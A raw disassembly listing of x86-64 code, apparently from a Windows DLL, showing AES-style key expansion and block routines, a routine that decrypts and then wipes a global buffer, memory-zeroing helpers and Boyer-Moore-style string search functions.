    696835b7:	4c 21 c3             	and    %r8,%rbx
    696835ba:	4c 21 cf             	and    %r9,%rdi
    696835bd:	48 09 f8             	or     %rdi,%rax
    696835c0:	48 09 d8             	or     %rbx,%rax
    696835c3:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
    696835c7:	48 39 d1             	cmp    %rdx,%rcx
    696835ca:	75 9d                	jne    0x69683569
    696835cc:	48 89 f1             	mov    %rsi,%rcx
    696835cf:	e8 1b e2 ff ff       	call   0x696817ef
    696835d4:	48 89 f1             	mov    %rsi,%rcx
    696835d7:	48 8b 45 00          	mov    0x0(%rbp),%rax
    696835db:	48 31 84 24 b0 00 00 	xor    %rax,0xb0(%rsp)
    696835e2:	00 
    696835e3:	48 8b 45 08          	mov    0x8(%rbp),%rax
    696835e7:	48 31 84 24 b8 00 00 	xor    %rax,0xb8(%rsp)
    696835ee:	00 
    696835ef:	48 8b 45 10          	mov    0x10(%rbp),%rax
    696835f3:	48 31 84 24 c0 00 00 	xor    %rax,0xc0(%rsp)
    696835fa:	00 
    696835fb:	48 8b 45 18          	mov    0x18(%rbp),%rax
    696835ff:	48 31 84 24 c8 00 00 	xor    %rax,0xc8(%rsp)
    69683606:	00 
    69683607:	48 8b 45 20          	mov    0x20(%rbp),%rax
    6968360b:	48 31 84 24 d0 00 00 	xor    %rax,0xd0(%rsp)
    69683612:	00 
    69683613:	48 8b 45 28          	mov    0x28(%rbp),%rax
    69683617:	48 31 84 24 d8 00 00 	xor    %rax,0xd8(%rsp)
    6968361e:	00 
    6968361f:	48 8b 45 30          	mov    0x30(%rbp),%rax
    69683623:	48 31 84 24 e0 00 00 	xor    %rax,0xe0(%rsp)
    6968362a:	00 
    6968362b:	48 8b 45 38          	mov    0x38(%rbp),%rax
    6968362f:	48 31 84 24 e8 00 00 	xor    %rax,0xe8(%rsp)
    69683636:	00 
    69683637:	e8 d5 f7 ff ff       	call   0x69682e11
    6968363c:	4c 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%r8
    69683643:	00 
    69683644:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
    6968364b:	00 
    6968364c:	4c 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%r11
    69683653:	00 
    69683654:	4c 89 d9             	mov    %r11,%rcx
    69683657:	e8 54 dd ff ff       	call   0x696813b0
    6968365c:	4c 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%r8
    69683663:	00 
    69683664:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
    6968366b:	00 
    6968366c:	49 8d 4b 10          	lea    0x10(%r11),%rcx
    69683670:	e8 3b dd ff ff       	call   0x696813b0
    69683675:	4c 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%r8
    6968367c:	00 
    6968367d:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
    69683684:	00 
    69683685:	49 8d 4b 20          	lea    0x20(%r11),%rcx
    69683689:	e8 22 dd ff ff       	call   0x696813b0
    6968368e:	4c 8b 84 24 e8 00 00 	mov    0xe8(%rsp),%r8
    69683695:	00 
    69683696:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
    6968369d:	00 
    6968369e:	49 8d 4b 30          	lea    0x30(%r11),%rcx
    696836a2:	e8 09 dd ff ff       	call   0x696813b0
    696836a7:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
    696836ae:	00 
    696836af:	48 8b b4 24 98 01 00 	mov    0x198(%rsp),%rsi
    696836b6:	00 
    696836b7:	48 89 06             	mov    %rax,(%rsi)
    696836ba:	48 8b 84 24 f8 00 00 	mov    0xf8(%rsp),%rax
    696836c1:	00 
    696836c2:	48 89 46 08          	mov    %rax,0x8(%rsi)
    696836c6:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
    696836cd:	5b                   	pop    %rbx
    696836ce:	5e                   	pop    %rsi
    696836cf:	5f                   	pop    %rdi
    696836d0:	5d                   	pop    %rbp
    696836d1:	41 5c                	pop    %r12
    696836d3:	41 5d                	pop    %r13
    696836d5:	41 5e                	pop    %r14
    696836d7:	41 5f                	pop    %r15
    696836d9:	c3                   	ret
    696836da:	41 54                	push   %r12
    696836dc:	55                   	push   %rbp
    696836dd:	57                   	push   %rdi
    696836de:	56                   	push   %rsi
    696836df:	53                   	push   %rbx
    696836e0:	48 83 ec 30          	sub    $0x30,%rsp
    696836e4:	31 db                	xor    %ebx,%ebx
    696836e6:	48 89 cf             	mov    %rcx,%rdi
    696836e9:	49 89 d4             	mov    %rdx,%r12
    696836ec:	4c 89 c5             	mov    %r8,%rbp
    696836ef:	4c 89 ce             	mov    %r9,%rsi
    696836f2:	48 39 de             	cmp    %rbx,%rsi
    696836f5:	7e 26                	jle    0x6968371d
    696836f7:	49 8d 14 1c          	lea    (%r12,%rbx,1),%rdx
    696836fb:	41 b8 10 00 00 00    	mov    $0x10,%r8d
    69683701:	48 89 f9             	mov    %rdi,%rcx
    69683704:	48 c7 44 24 20 10 00 	movq   $0x10,0x20(%rsp)
    6968370b:	00 00 
    6968370d:	4c 8d 4c 1d 00       	lea    0x0(%rbp,%rbx,1),%r9
    69683712:	48 83 c3 10          	add    $0x10,%rbx
    69683716:	e8 12 f9 ff ff       	call   0x6968302d
    6968371b:	eb d5                	jmp    0x696836f2
    6968371d:	48 89 f0             	mov    %rsi,%rax
    69683720:	48 83 c4 30          	add    $0x30,%rsp
    69683724:	5b                   	pop    %rbx
    69683725:	5e                   	pop    %rsi
    69683726:	5f                   	pop    %rdi
    69683727:	5d                   	pop    %rbp
    69683728:	41 5c                	pop    %r12
    6968372a:	c3                   	ret
    6968372b:	53                   	push   %rbx
    6968372c:	48 83 ec 60          	sub    $0x60,%rsp
    69683730:	ba 40 00 00 00       	mov    $0x40,%edx
    69683735:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
    6968373a:	41 89 c9             	mov    %ecx,%r9d
    6968373d:	48 89 d9             	mov    %rbx,%rcx
    69683740:	e8 87 e2 ff ff       	call   0x696819cc
    69683745:	48 89 d9             	mov    %rbx,%rcx
    69683748:	44 89 c8             	mov    %r9d,%eax
    6968374b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69683750:	e8 bc f6 ff ff       	call   0x69682e11
    69683755:	e8 9b dd ff ff       	call   0x696814f5
    6968375a:	e8 b2 f6 ff ff       	call   0x69682e11
    6968375f:	8b 44 24 20          	mov    0x20(%rsp),%eax
    69683763:	48 83 c4 60          	add    $0x60,%rsp
    69683767:	5b                   	pop    %rbx
    69683768:	c3                   	ret
    69683769:	41 57                	push   %r15
    6968376b:	41 56                	push   %r14
    6968376d:	41 55                	push   %r13
    6968376f:	41 54                	push   %r12
    69683771:	55                   	push   %rbp
    69683772:	57                   	push   %rdi
    69683773:	56                   	push   %rsi
    69683774:	53                   	push   %rbx
    69683775:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
    6968377c:	4c 8d 2d 4d bb 00 00 	lea    0xbb4d(%rip),%r13        # 0x6968f2d0
    69683783:	31 ed                	xor    %ebp,%ebp
    69683785:	45 31 f6             	xor    %r14d,%r14d
    69683788:	48 8d bc 24 50 01 00 	lea    0x150(%rsp),%rdi
    6968378f:	00 
    69683790:	49 89 d1             	mov    %rdx,%r9
    69683793:	48 89 cb             	mov    %rcx,%rbx
    69683796:	ba f0 00 00 00       	mov    $0xf0,%edx
    6968379b:	48 89 f9             	mov    %rdi,%rcx
    6968379e:	49 89 ff             	mov    %rdi,%r15
    696837a1:	e8 26 e2 ff ff       	call   0x696819cc
    696837a6:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
    696837ab:	ba f0 00 00 00       	mov    $0xf0,%edx
    696837b0:	4c 8d a7 d0 00 00 00 	lea    0xd0(%rdi),%r12
    696837b7:	48 89 f1             	mov    %rsi,%rcx
    696837ba:	e8 0d e2 ff ff       	call   0x696819cc
    696837bf:	48 c7 83 c0 03 00 00 	movq   $0xe,0x3c0(%rbx)
    696837c6:	0e 00 00 00 
    696837ca:	49 8b 11             	mov    (%r9),%rdx
    696837cd:	41 8b 49 1c          	mov    0x1c(%r9),%ecx
    696837d1:	48 89 94 24 50 01 00 	mov    %rdx,0x150(%rsp)
    696837d8:	00 
    696837d9:	49 8b 51 08          	mov    0x8(%r9),%rdx
    696837dd:	48 89 94 24 58 01 00 	mov    %rdx,0x158(%rsp)
    696837e4:	00 
    696837e5:	49 8b 51 10          	mov    0x10(%r9),%rdx
    696837e9:	48 89 94 24 60 01 00 	mov    %rdx,0x160(%rsp)
    696837f0:	00 
    696837f1:	49 8b 51 18          	mov    0x18(%r9),%rdx
    696837f5:	48 89 94 24 68 01 00 	mov    %rdx,0x168(%rsp)
    696837fc:	00 
    696837fd:	4d 85 f6             	test   %r14,%r14
    69683800:	74 0f                	je     0x69683811
    69683802:	49 83 fe 04          	cmp    $0x4,%r14
    69683806:	75 19                	jne    0x69683821
    69683808:	e8 1e ff ff ff       	call   0x6968372b
    6968380d:	89 c1                	mov    %eax,%ecx
    6968380f:	eb 10                	jmp    0x69683821
    69683811:	c1 c9 08             	ror    $0x8,%ecx
    69683814:	e8 12 ff ff ff       	call   0x6968372b
    69683819:	41 0f b6 4c 2d 00    	movzbl 0x0(%r13,%rbp,1),%ecx
    6968381f:	31 c1                	xor    %eax,%ecx
    69683821:	41 33 0f             	xor    (%r15),%ecx
    69683824:	49 ff c6             	inc    %r14
    69683827:	49 83 fe 08          	cmp    $0x8,%r14
    6968382b:	41 89 4f 20          	mov    %ecx,0x20(%r15)
    6968382f:	75 06                	jne    0x69683837
    69683831:	48 ff c5             	inc    %rbp
    69683834:	45 31 f6             	xor    %r14d,%r14d
    69683837:	49 83 c7 04          	add    $0x4,%r15
    6968383b:	4d 39 fc             	cmp    %r15,%r12
    6968383e:	75 bd                	jne    0x696837fd
    69683840:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
    69683845:	45 31 ed             	xor    %r13d,%r13d
    69683848:	49 be 11 11 11 11 11 	movabs $0x1111111111111111,%r14
    6968384f:	11 11 11 
    69683852:	4c 8d 65 20          	lea    0x20(%rbp),%r12
    69683856:	ba 40 00 00 00       	mov    $0x40,%edx
    6968385b:	48 89 e9             	mov    %rbp,%rcx
    6968385e:	e8 69 e1 ff ff       	call   0x696819cc
    69683863:	4e 8d 04 2f          	lea    (%rdi,%r13,1),%r8
    69683867:	4c 89 e2             	mov    %r12,%rdx
    6968386a:	48 89 e9             	mov    %rbp,%rcx
    6968386d:	e8 d5 db ff ff       	call   0x69681447
    69683872:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    69683877:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6968387c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    69683881:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    69683886:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    6968388b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    69683890:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
    69683895:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
    6968389a:	e8 72 f5 ff ff       	call   0x69682e11
    6968389f:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
    696838a4:	49 b9 22 22 22 22 22 	movabs $0x2222222222222222,%r9
    696838ab:	22 22 22 
    696838ae:	49 b8 44 44 44 44 44 	movabs $0x4444444444444444,%r8
    696838b5:	44 44 44 
    696838b8:	48 b9 88 88 88 88 88 	movabs $0x8888888888888888,%rcx
    696838bf:	88 88 88 
    696838c2:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696838c7:	4c 21 f2             	and    %r14,%rdx
    696838ca:	4c 21 c8             	and    %r9,%rax
    696838cd:	4c 23 4c 24 48       	and    0x48(%rsp),%r9
    696838d2:	48 09 c2             	or     %rax,%rdx
    696838d5:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
    696838da:	4c 21 c0             	and    %r8,%rax
    696838dd:	4c 23 44 24 50       	and    0x50(%rsp),%r8
    696838e2:	48 09 c2             	or     %rax,%rdx
    696838e5:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
    696838ea:	48 21 c8             	and    %rcx,%rax
    696838ed:	48 23 4c 24 58       	and    0x58(%rsp),%rcx
    696838f2:	48 09 c2             	or     %rax,%rdx
    696838f5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    696838fa:	4a 89 14 2e          	mov    %rdx,(%rsi,%r13,1)
    696838fe:	4c 21 f0             	and    %r14,%rax
    69683901:	4c 09 c8             	or     %r9,%rax
    69683904:	4c 09 c0             	or     %r8,%rax
    69683907:	48 09 c8             	or     %rcx,%rax
    6968390a:	4a 89 44 2e 08       	mov    %rax,0x8(%rsi,%r13,1)
    6968390f:	49 83 c5 10          	add    $0x10,%r13
    69683913:	49 81 fd f0 00 00 00 	cmp    $0xf0,%r13
    6968391a:	0f 85 36 ff ff ff    	jne    0x69683856
    69683920:	48 8b 83 c0 03 00 00 	mov    0x3c0(%rbx),%rax
    69683927:	45 31 c9             	xor    %r9d,%r9d
    6968392a:	49 ba 11 11 11 11 11 	movabs $0x1111111111111111,%r10
    69683931:	11 11 11 
    69683934:	48 8d 50 01          	lea    0x1(%rax),%rdx
    69683938:	48 01 d2             	add    %rdx,%rdx
    6968393b:	49 39 d1             	cmp    %rdx,%r9
    6968393e:	7d 4d                	jge    0x6968398d
    69683940:	4a 8b 04 ce          	mov    (%rsi,%r9,8),%rax
    69683944:	48 83 c3 20          	add    $0x20,%rbx
    69683948:	49 ff c1             	inc    %r9
    6968394b:	49 89 c0             	mov    %rax,%r8
    6968394e:	48 89 c1             	mov    %rax,%rcx
    69683951:	49 89 c3             	mov    %rax,%r11
    69683954:	49 d1 e8             	shr    $1,%r8
    69683957:	48 c1 e9 02          	shr    $0x2,%rcx
    6968395b:	4d 21 d3             	and    %r10,%r11
    6968395e:	48 c1 e8 03          	shr    $0x3,%rax
    69683962:	4d 21 d0             	and    %r10,%r8
    69683965:	4c 21 d1             	and    %r10,%rcx
    69683968:	4d 6b db 0f          	imul   $0xf,%r11,%r11
    6968396c:	4c 21 d0             	and    %r10,%rax
    6968396f:	4d 6b c0 0f          	imul   $0xf,%r8,%r8
    69683973:	48 6b c9 0f          	imul   $0xf,%rcx,%rcx
    69683977:	48 6b c0 0f          	imul   $0xf,%rax,%rax
    6968397b:	4c 89 5b e0          	mov    %r11,-0x20(%rbx)
    6968397f:	4c 89 43 e8          	mov    %r8,-0x18(%rbx)
    69683983:	48 89 4b f0          	mov    %rcx,-0x10(%rbx)
    69683987:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
    6968398b:	eb ae                	jmp    0x6968393b
    6968398d:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
    69683994:	5b                   	pop    %rbx
    69683995:	5e                   	pop    %rsi
    69683996:	5f                   	pop    %rdi
    69683997:	5d                   	pop    %rbp
    69683998:	41 5c                	pop    %r12
    6968399a:	41 5d                	pop    %r13
    6968399c:	41 5e                	pop    %r14
    6968399e:	41 5f                	pop    %r15
    696839a0:	c3                   	ret
    696839a1:	41 b8 20 00 00 00    	mov    $0x20,%r8d
    696839a7:	e9 bd fd ff ff       	jmp    0x69683769
    696839ac:	48 83 ec 38          	sub    $0x38,%rsp
    696839b0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
    696839b5:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696839ba:	49 89 d1             	mov    %rdx,%r9
    696839bd:	48 85 c0             	test   %rax,%rax
    696839c0:	74 24                	je     0x696839e6
    696839c2:	e8 05 e0 ff ff       	call   0x696819cc
    696839c7:	4d 85 c9             	test   %r9,%r9
    696839ca:	7e 1a                	jle    0x696839e6
    696839cc:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696839d1:	49 ff c9             	dec    %r9
    696839d4:	c6 00 00             	movb   $0x0,(%rax)
    696839d7:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    696839dc:	48 ff c0             	inc    %rax
    696839df:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696839e4:	eb e1                	jmp    0x696839c7
    696839e6:	48 83 c4 38          	add    $0x38,%rsp
    696839ea:	c3                   	ret
    696839eb:	41 54                	push   %r12
    696839ed:	55                   	push   %rbp
    696839ee:	57                   	push   %rdi
    696839ef:	56                   	push   %rsi
    696839f0:	53                   	push   %rbx
    696839f1:	48 83 ec 30          	sub    $0x30,%rsp
    696839f5:	48 8b 15 44 0c 10 00 	mov    0x100c44(%rip),%rdx        # 0x69784640
    696839fc:	48 8d 0d 5d 12 10 00 	lea    0x10125d(%rip),%rcx        # 0x69784c60
    69683a03:	31 db                	xor    %ebx,%ebx
    69683a05:	48 8d 35 54 12 10 00 	lea    0x101254(%rip),%rsi        # 0x69784c60
    69683a0c:	e8 90 ff ff ff       	call   0x696839a1
    69683a11:	48 8b 3d b8 0b 10 00 	mov    0x100bb8(%rip),%rdi        # 0x697845d0
    69683a18:	48 8b 2d 11 1a 10 00 	mov    0x101a11(%rip),%rbp        # 0x69785430
    69683a1f:	4c 8b 25 a2 8e 10 00 	mov    0x108ea2(%rip),%r12        # 0x6978c8c8
    69683a26:	49 39 dc             	cmp    %rbx,%r12
    69683a29:	7e 26                	jle    0x69683a51
    69683a2b:	48 8d 54 1d 00       	lea    0x0(%rbp,%rbx,1),%rdx
    69683a30:	41 b8 10 00 00 00    	mov    $0x10,%r8d
    69683a36:	48 89 f1             	mov    %rsi,%rcx
    69683a39:	48 c7 44 24 20 10 00 	movq   $0x10,0x20(%rsp)
    69683a40:	00 00 
    69683a42:	4c 8d 0c 1f          	lea    (%rdi,%rbx,1),%r9
    69683a46:	48 83 c3 10          	add    $0x10,%rbx
    69683a4a:	e8 de f5 ff ff       	call   0x6968302d
    69683a4f:	eb d5                	jmp    0x69683a26
    69683a51:	48 8d 0d 08 12 10 00 	lea    0x101208(%rip),%rcx        # 0x69784c60
    69683a58:	ba c8 03 00 00       	mov    $0x3c8,%edx
    69683a5d:	48 83 c4 30          	add    $0x30,%rsp
    69683a61:	5b                   	pop    %rbx
    69683a62:	5e                   	pop    %rsi
    69683a63:	5f                   	pop    %rdi
    69683a64:	5d                   	pop    %rbp
    69683a65:	41 5c                	pop    %r12
    69683a67:	e9 40 ff ff ff       	jmp    0x696839ac
    69683a6c:	89 c8                	mov    %ecx,%eax
    69683a6e:	c3                   	ret
    69683a6f:	57                   	push   %rdi
    69683a70:	56                   	push   %rsi
    69683a71:	53                   	push   %rbx
    69683a72:	4c 8b 54 24 40       	mov    0x40(%rsp),%r10
    69683a77:	4d 85 d2             	test   %r10,%r10
    69683a7a:	75 0f                	jne    0x69683a8b
    69683a7c:	49 83 ca ff          	or     $0xffffffffffffffff,%r10
    69683a80:	48 85 d2             	test   %rdx,%rdx
    69683a83:	74 06                	je     0x69683a8b
    69683a85:	48 8b 02             	mov    (%rdx),%rax
    69683a88:	49 01 c2             	add    %rax,%r10
    69683a8b:	4d 85 c0             	test   %r8,%r8
    69683a8e:	74 48                	je     0x69683ad8
    69683a90:	49 8b 00             	mov    (%r8),%rax
    69683a93:	48 ff c8             	dec    %rax
    69683a96:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    69683a9a:	74 3c                	je     0x69683ad8
    69683a9c:	48 8d 34 02          	lea    (%rdx,%rax,1),%rsi
    69683aa0:	4d 89 d3             	mov    %r10,%r11
    69683aa3:	4d 29 cb             	sub    %r9,%r11
    69683aa6:	49 39 c3             	cmp    %rax,%r11
    69683aa9:	7c 29                	jl     0x69683ad4
    69683aab:	4a 8d 1c 0a          	lea    (%rdx,%r9,1),%rbx
    69683aaf:	49 89 c3             	mov    %rax,%r11
    69683ab2:	43 8a 7c 18 10       	mov    0x10(%r8,%r11,1),%dil
    69683ab7:	41 38 7c 1b 10       	cmp    %dil,0x10(%r11,%rbx,1)
    69683abc:	74 0c                	je     0x69683aca
    69683abe:	45 0f b6 5c 31 10    	movzbl 0x10(%r9,%rsi,1),%r11d
    69683ac4:	4e 03 0c d9          	add    (%rcx,%r11,8),%r9
    69683ac8:	eb d6                	jmp    0x69683aa0
    69683aca:	4d 85 db             	test   %r11,%r11
    69683acd:	74 09                	je     0x69683ad8
    69683acf:	49 ff cb             	dec    %r11
    69683ad2:	eb de                	jmp    0x69683ab2
    69683ad4:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
    69683ad8:	4c 89 c8             	mov    %r9,%rax
    69683adb:	5b                   	pop    %rbx
    69683adc:	5e                   	pop    %rsi
    69683add:	5f                   	pop    %rdi
    69683ade:	c3                   	ret
    69683adf:	31 c0                	xor    %eax,%eax
    69683ae1:	48 39 d0             	cmp    %rdx,%rax
    69683ae4:	7d 09                	jge    0x69683aef
    69683ae6:	4c 89 04 c1          	mov    %r8,(%rcx,%rax,8)
    69683aea:	48 ff c0             	inc    %rax
    69683aed:	eb f2                	jmp    0x69683ae1
    69683aef:	c3                   	ret
    69683af0:	48 83 ec 28          	sub    $0x28,%rsp
    69683af4:	45 31 c9             	xor    %r9d,%r9d
    69683af7:	48 85 d2             	test   %rdx,%rdx
    69683afa:	49 89 cb             	mov    %rcx,%r11
    69683afd:	49 89 d2             	mov    %rdx,%r10
    69683b00:	74 03                	je     0x69683b05
    69683b02:	4c 8b 0a             	mov    (%rdx),%r9
    69683b05:	4d 89 c8             	mov    %r9,%r8
    69683b08:	ba 00 01 00 00       	mov    $0x100,%edx
    69683b0d:	4c 89 d9             	mov    %r11,%rcx
    69683b10:	e8 ca ff ff ff       	call   0x69683adf
    69683b15:	31 c0                	xor    %eax,%eax
    69683b17:	49 ff c9             	dec    %r9
    69683b1a:	4c 39 c8             	cmp    %r9,%rax
    69683b1d:	7d 15                	jge    0x69683b34
    69683b1f:	41 0f b6 54 02 10    	movzbl 0x10(%r10,%rax,1),%edx
    69683b25:	4c 89 c9             	mov    %r9,%rcx
    69683b28:	48 29 c1             	sub    %rax,%rcx
    69683b2b:	48 ff c0             	inc    %rax
    69683b2e:	49 89 0c d3          	mov    %rcx,(%r11,%rdx,8)
    69683b32:	eb e6                	jmp    0x69683b1a
    69683b34:	48 83 c4 28          	add    $0x28,%rsp
    69683b38:	c3                   	ret
    69683b39:	53                   	push   %rbx
    69683b3a:	48 83 ec 20          	sub    $0x20,%rsp
    69683b3e:	4d 85 c9             	test   %r9,%r9
    69683b41:	48 89 cb             	mov    %rcx,%rbx
    69683b44:	75 0f                	jne    0x69683b55
    69683b46:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
    69683b4a:	48 85 c9             	test   %rcx,%rcx
    69683b4d:	74 06                	je     0x69683b55
    69683b4f:	48 8b 01             	mov    (%rcx),%rax
    69683b52:	49 01 c1             	add    %rax,%r9
    69683b55:	4d 29 c1             	sub    %r8,%r9
    69683b58:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683b5c:	49 ff c1             	inc    %r9
    69683b5f:	4d 85 c9             	test   %r9,%r9
    69683b62:	7e 2a                	jle    0x69683b8e
    69683b64:	4a 8d 4c 03 10       	lea    0x10(%rbx,%r8,1),%rcx
    69683b69:	0f be d2             	movsbl %dl,%edx
    69683b6c:	4d 89 c8             	mov    %r9,%r8
    69683b6f:	e8 b4 8a 00 00       	call   0x6968c628
    69683b74:	48 89 c2             	mov    %rax,%rdx
    69683b77:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683b7b:	48 85 d2             	test   %rdx,%rdx
    69683b7e:	74 0e                	je     0x69683b8e
    69683b80:	48 89 d9             	mov    %rbx,%rcx
    69683b83:	e8 76 dd ff ff       	call   0x696818fe
    69683b88:	48 29 c2             	sub    %rax,%rdx
    69683b8b:	48 89 d0             	mov    %rdx,%rax
    69683b8e:	48 83 c4 20          	add    $0x20,%rsp
    69683b92:	5b                   	pop    %rbx
    69683b93:	c3                   	ret
    69683b94:	57                   	push   %rdi
    69683b95:	56                   	push   %rsi
    69683b96:	53                   	push   %rbx
    69683b97:	48 81 ec 30 08 00 00 	sub    $0x830,%rsp
    69683b9e:	48 89 d6             	mov    %rdx,%rsi
    69683ba1:	31 d2                	xor    %edx,%edx
    69683ba3:	48 85 c9             	test   %rcx,%rcx
    69683ba6:	48 89 cb             	mov    %rcx,%rbx
    69683ba9:	74 03                	je     0x69683bae
    69683bab:	48 8b 11             	mov    (%rcx),%rdx
    69683bae:	48 89 d1             	mov    %rdx,%rcx
    69683bb1:	4c 29 c1             	sub    %r8,%rcx
    69683bb4:	48 85 f6             	test   %rsi,%rsi
    69683bb7:	0f 84 bb 00 00 00    	je     0x69683c78
    69683bbd:	4c 8b 16             	mov    (%rsi),%r10
    69683bc0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683bc4:	4c 39 d1             	cmp    %r10,%rcx
    69683bc7:	0f 8c b8 00 00 00    	jl     0x69683c85
    69683bcd:	49 ff ca             	dec    %r10
    69683bd0:	74 07                	je     0x69683bd9
    69683bd2:	4d 85 c9             	test   %r9,%r9
    69683bd5:	74 13                	je     0x69683bea
    69683bd7:	eb 16                	jmp    0x69683bef
    69683bd9:	0f be 56 10          	movsbl 0x10(%rsi),%edx
    69683bdd:	48 89 d9             	mov    %rbx,%rcx
    69683be0:	e8 54 ff ff ff       	call   0x69683b39
    69683be5:	e9 9b 00 00 00       	jmp    0x69683c85
    69683bea:	4c 39 c2             	cmp    %r8,%rdx
    69683bed:	7f 48                	jg     0x69683c37
    69683bef:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
    69683bf4:	48 89 f2             	mov    %rsi,%rdx
    69683bf7:	4c 89 8c 24 68 08 00 	mov    %r9,0x868(%rsp)
    69683bfe:	00 
    69683bff:	48 89 f9             	mov    %rdi,%rcx
    69683c02:	4c 89 84 24 60 08 00 	mov    %r8,0x860(%rsp)
    69683c09:	00 
    69683c0a:	e8 e1 fe ff ff       	call   0x69683af0
    69683c0f:	4c 8b 8c 24 68 08 00 	mov    0x868(%rsp),%r9
    69683c16:	00 
    69683c17:	48 89 da             	mov    %rbx,%rdx
    69683c1a:	48 89 f9             	mov    %rdi,%rcx
    69683c1d:	4c 8b 84 24 60 08 00 	mov    0x860(%rsp),%r8
    69683c24:	00 
    69683c25:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    69683c2a:	4d 89 c1             	mov    %r8,%r9
    69683c2d:	49 89 f0             	mov    %rsi,%r8
    69683c30:	e8 3a fe ff ff       	call   0x69683a6f
    69683c35:	eb 4e                	jmp    0x69683c85
    69683c37:	48 89 f1             	mov    %rsi,%rcx
    69683c3a:	4c 89 84 24 60 08 00 	mov    %r8,0x860(%rsp)
    69683c41:	00 
    69683c42:	e8 b7 dc ff ff       	call   0x696818fe
    69683c47:	4c 8b 84 24 60 08 00 	mov    0x860(%rsp),%r8
    69683c4e:	00 
    69683c4f:	48 89 c2             	mov    %rax,%rdx
    69683c52:	4a 8d 4c 03 10       	lea    0x10(%rbx,%r8,1),%rcx
    69683c57:	e8 b4 89 00 00       	call   0x6968c610
    69683c5c:	48 89 c2             	mov    %rax,%rdx
    69683c5f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683c63:	48 85 d2             	test   %rdx,%rdx
    69683c66:	74 1d                	je     0x69683c85
    69683c68:	48 89 d9             	mov    %rbx,%rcx
    69683c6b:	e8 8e dc ff ff       	call   0x696818fe
    69683c70:	48 29 c2             	sub    %rax,%rdx
    69683c73:	48 89 d0             	mov    %rdx,%rax
    69683c76:	eb 0d                	jmp    0x69683c85
    69683c78:	48 85 c9             	test   %rcx,%rcx
    69683c7b:	0f 89 51 ff ff ff    	jns    0x69683bd2
    69683c81:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683c85:	48 81 c4 30 08 00 00 	add    $0x830,%rsp
    69683c8c:	5b                   	pop    %rbx
    69683c8d:	5e                   	pop    %rsi
    69683c8e:	5f                   	pop    %rdi
    69683c8f:	c3                   	ret
    69683c90:	48 83 ec 28          	sub    $0x28,%rsp
    69683c94:	45 31 c9             	xor    %r9d,%r9d
    69683c97:	45 31 c0             	xor    %r8d,%r8d
    69683c9a:	e8 f5 fe ff ff       	call   0x69683b94
    69683c9f:	48 f7 d0             	not    %rax
    69683ca2:	48 c1 e8 3f          	shr    $0x3f,%rax
    69683ca6:	48 83 c4 28          	add    $0x28,%rsp
    69683caa:	c3                   	ret
    69683cab:	56                   	push   %rsi
    69683cac:	53                   	push   %rbx
    69683cad:	31 db                	xor    %ebx,%ebx
    69683caf:	48 85 c9             	test   %rcx,%rcx
    69683cb2:	74 03                	je     0x69683cb7
    69683cb4:	48 8b 19             	mov    (%rcx),%rbx
    69683cb7:	45 31 db             	xor    %r11d,%r11d
    69683cba:	48 85 d2             	test   %rdx,%rdx
    69683cbd:	74 03                	je     0x69683cc2
    69683cbf:	4c 8b 1a             	mov    (%rdx),%r11
    69683cc2:	45 31 d2             	xor    %r10d,%r10d
    69683cc5:	45 31 c0             	xor    %r8d,%r8d
    69683cc8:	49 39 da             	cmp    %rbx,%r10
    69683ccb:	7d 18                	jge    0x69683ce5
    69683ccd:	42 80 7c 11 10 5f    	cmpb   $0x5f,0x10(%rcx,%r10,1)
    69683cd3:	75 10                	jne    0x69683ce5
    69683cd5:	49 ff c2             	inc    %r10
    69683cd8:	eb ee                	jmp    0x69683cc8
    69683cda:	42 80 7c 02 10 5f    	cmpb   $0x5f,0x10(%rdx,%r8,1)
    69683ce0:	75 08                	jne    0x69683cea
    69683ce2:	49 ff c0             	inc    %r8
    69683ce5:	4d 39 d8             	cmp    %r11,%r8
    69683ce8:	7c f0                	jl     0x69683cda
    69683cea:	31 c0                	xor    %eax,%eax
    69683cec:	49 39 da             	cmp    %rbx,%r10
